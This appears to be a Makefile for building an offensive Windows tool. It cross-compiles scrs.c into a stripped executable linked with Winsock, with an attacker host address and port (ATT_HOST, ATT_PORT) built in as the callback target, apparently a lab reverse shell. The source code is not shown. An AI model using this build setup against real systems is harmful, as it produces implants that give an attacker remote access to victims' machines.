CC=i686-w64-mingw32-g++
BUILD_DIR=build
CFLAGS=-o $(BUILD_DIR)/scrs.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc

ATT_HOST=192.168.247.129
IP_Addr= -DIP=\"$(ATT_HOST)\"
ATT_PORT=8080
PORT= -DPORT=$(ATT_PORT)
ATT_LOC= $(IP_Addr) $(PORT)

$(shell mkdir -p $(BUILD_DIR))
.PHONY: build clean
build: scrs.c
	$(CC) scrs.c $(CFLAGS) $(ATT_LOC)

clean:
	rm -rf $(BUILD_DIR)